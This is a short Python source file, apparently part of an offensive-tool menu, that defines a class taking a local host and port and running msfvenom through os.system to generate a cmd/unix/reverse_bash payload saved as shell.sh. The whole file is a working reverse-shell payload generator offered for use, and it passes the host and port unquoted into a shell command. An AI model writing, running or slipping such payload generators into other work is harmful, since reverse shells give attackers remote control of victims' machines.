#Modules
from etc.banner import banner_drgn
from etc.set import clear
from etc.set import *
from lib.list import list_tools
from lib.list import list_Script
#===================
import sys,os,socket,time,datetime
#===================
NFound='\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
Aborted='\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
#===================
class script_bash_unix:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        try:
            clear()
            print('''
  [+] LOCAL HOST : {}
  [+] LOCAL PORT : {}
  [!] Loading ....'''.format(self.lhost, self.lport))
            os.system('msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw > shell.sh'.format(self.lhost, self.lport))
            sys.exit('\u001b[1m[\u001b[32;1mSUCCESSFULLY\u001b[0m\u001b[1m]\u001b[0m')
        except KeyboardInterrupt:
            sys.exit(Aborted)
